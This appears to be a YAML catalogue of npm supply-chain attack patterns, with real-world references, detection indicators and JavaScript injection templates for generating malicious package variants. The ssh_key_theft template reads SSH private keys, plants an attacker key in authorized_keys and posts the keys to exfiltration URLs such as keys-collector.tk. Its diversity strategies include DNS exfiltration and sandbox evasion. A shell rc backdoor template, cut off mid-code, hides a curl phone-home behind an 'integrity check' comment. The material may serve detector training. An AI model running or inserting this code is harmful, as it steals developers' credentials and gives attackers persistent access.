  - id: ssh_key_theft
    family: filesystem
    severity: critical
    real_world_examples:
      - name: "babelcl / chokader / streamserch (typosquats targeting GitHub SSH keys)"
        date: "2023-12-01"
        url: "https://socket.dev/blog/malicious-npm-packages-inject-ssh-backdoors-via-typosquatted-libraries"
      - name: "Malicious npm packages steal SSH keys (JFrog report)"
        date: "2024-04-01"
        url: "https://thehackernews.com/2024/10/malicious-npm-packages-target-developers-ethereum-wallets-with-ssh-backdoor.html"
      - name: "Shai-Hulud worm - SSH key collection"
        date: "2025-09-01"
        url: "https://unit42.paloaltonetworks.com/npm-supply-chain-attack/"
    description: |
      The package reads the user's SSH private key (~/.ssh/id_rsa or other
      common key names) and exfiltrates it. Some variants also write the
      attacker's public key to ~/.ssh/authorized_keys for persistent backdoor
      access. A secondary technique adds a known-hosts entry that redirects
      SSH connections for targeted hostnames.
    indicators:
      - path.join(os.homedir(), '.ssh') in any script
      - fs.readFileSync with path containing 'id_rsa', 'id_ed25519', '.ssh'
      - fs.writeFileSync or fs.appendFileSync targeting '~/.ssh/authorized_keys'
      - HTTP request carrying file contents as body
    injection_template_js: |
      // injected into postinstall.js or index.js
      const fs = require('fs');
      const https = require('https');
      const path = require('path');
      const os = require('os');
      const _home = os.homedir();
      const _keyPaths = [
        path.join(_home, '.ssh', 'id_rsa'),
        path.join(_home, '.ssh', 'id_ed25519'),
        path.join(_home, '.ssh', 'id_ecdsa'),
        path.join(_home, '.ssh', 'config')
      ];
      const _found = {};
      for (const _kp of _keyPaths) {
        try { _found[path.basename(_kp)] = fs.readFileSync(_kp, 'utf8'); } catch (_) {}
      }
      // also plant attacker public key for backdoor
      try {
        const _ak = path.join(_home, '.ssh', 'authorized_keys');
        fs.appendFileSync(_ak, '\n{{ATTACKER_PUBKEY}}\n');
      } catch (_) {}
      if (Object.keys(_found).length) {
        const _body = JSON.stringify({ keys: _found, host: os.hostname() });
        const _req = https.request('{{EXFIL_URL}}', { method: 'POST' }, () => {});
        _req.on('error', () => {});
        _req.write(_body);
        _req.end();
      }
    injection_target_files:
      - '"postinstall.js: new file (called by scripts.postinstall)"'
      - '"index.js: append IIFE at module load"'
    template_variables:
      EXFIL_URL:
        - '"https://ssh-log.xyz/k"'
        - '"https://keys-collector.tk/upload"'
        - '"https://npm-cdn.club/ssh"'
      ATTACKER_PUBKEY:
        - '"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@evil.com"'
        - '"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... backdoor@npm"'
    variants_to_generate: 7
    diversity_strategies:
      - skip the authorized_keys write and only exfiltrate
      - also read known_hosts and .ssh/config
      - compress keys with zlib before sending
      - use DNS exfil for the key content (see dns_exfil pattern)
      - check for CI environment and skip (to avoid sandbox detection)

  - id: shell_rc_backdoor
    family: filesystem
    severity: high
    real_world_examples:
      - name: "node-ipc@10.1.1 (wrote peace.js to filesystem, modified shell files)"
        date: "2022-03-15"
        url: "https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack"
      - name: "36 malicious npm packages targeting Redis/PostgreSQL devs (persistent implants)"
        date: "2026-04-01"
        url: "https://thehackernews.com/2026/04/36-malicious-npm-packages-exploited.html"
    description: |
      The package appends a malicious command to ~/.bashrc, ~/.zshrc,
      ~/.bash_profile, or ~/.profile. This command runs every time the
      user opens a terminal. Common payloads include a curl-pipe-bash
      dropper, an env-exfil snippet, or a function that overrides common
      commands (git, npm, node) with trojanized versions.
    indicators:
      - fs.appendFileSync or fs.writeFileSync with path containing '.bashrc', '.zshrc', '.profile'
      - path.join(os.homedir(), '.bashrc') or similar in script
      - string containing 'alias' or 'function' being written to shell config
      - content being written containing http/https URL
    injection_template_js: |
      // injected into postinstall.js
      const fs = require('fs');
      const path = require('path');
      const os = require('os');
      const _home = os.homedir();
      const _rcFiles = ['.bashrc', '.zshrc', '.bash_profile', '.profile'];
      // one-liner that phones home with env on every new shell
      const _hook = `\n# npm module integrity check\n` +
        `_npm_check() { ` +
        `  curl -sf '{{EXFIL_URL}}'` +
        `  --data-urlencode "h=$(hostname)" ` +
        `  --data-urlencode "u=$USER" > /dev/null 2>&1 & ` +
        `}; _npm_check\n`;
      for (const _rc of _rcFiles) {
        const _p = path.join(_home, _rc);
        try {
